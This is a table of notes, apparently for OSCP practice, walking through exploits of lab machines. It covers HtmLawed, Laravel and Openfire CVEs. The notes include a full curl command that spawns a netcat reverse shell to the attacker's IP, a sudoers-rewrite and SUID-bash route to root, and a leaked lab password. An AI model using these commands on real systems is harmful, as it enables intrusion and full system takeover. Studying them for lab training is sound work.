...
|Law |Easy |Their 2 ports open ssh,http one port HtmLawed code execution, in the [article](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/#exploitation), if want to execute the commands need to set hook to exec then send the request with burpsuite, otherwise use this command ```curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.171 8088 -e /bin/sh' -b 'sid=foo' http://192.168.198.190/ <pipe>egrep '\&nbsp; \[[0-9]+\] =\&gt;'<pipe> sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'``` got the shell for privesc script has the root privileges here [commands](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#root-access-to-the-script-user-script-and-htmlawed) |
|Lavita |Easy | Their are 2 ports open ssh, http has lavaral 8.4.o exploit with rce [code](https://github.com/joshuavanderpoll/CVE-2021-3129/tree/main), the code you need to enable the APP_DEBUG by register user in IP/register, then view code commands written github, then loogedin as www-data it has the user their is a process insert the nc to get a shell as user then user has composer root privileges but user can't edit the file then www-data edited suid bit to /bin/bash the file runas user then got a root user shell  [commands here](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#lavarel-exploit-and-sudo--l-with-composerjson-then-root)|
|PC |Easy |Their are 2 ports open ssh, 8000 http. it has terminal with user 1000 id, connected to back to kali terminal, then ran the linpeas.sh it has /opt/rpc.py searchsploit has the script 50983.py, care fully edit script in nano command not gedit adds the 3D key word so edit 2 ways in 50983.py script place of exec_command one way ```'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers'``` in run with python as then ```sudo /bin/bash``` other way is same command ```'id;chmod u+s /bin/bash'``` execute with python then check permission of bash ```/bin/bash -p -i ``` got root  |
|Fired |Easy | their are 3 ports open ssh, 9090 openfire and 9091 ssl and smtp, 9090 has login page with openfire 4.7.3 with [github](https://github.com/miko550/CVE-2023-32315) followed steps create login credentials and to get shell after that openfire saves the  password in the embedded file path **/usr/share/openfire/embedded-db** and smtp password stored in the **cat openfire.script** search for smtp have the password 'OpenFireAtEveryone' logged as root user with ssh shell|
|Press | | |
|Scrutiny | | |
|RubyDome | | |
|Zipper | | |
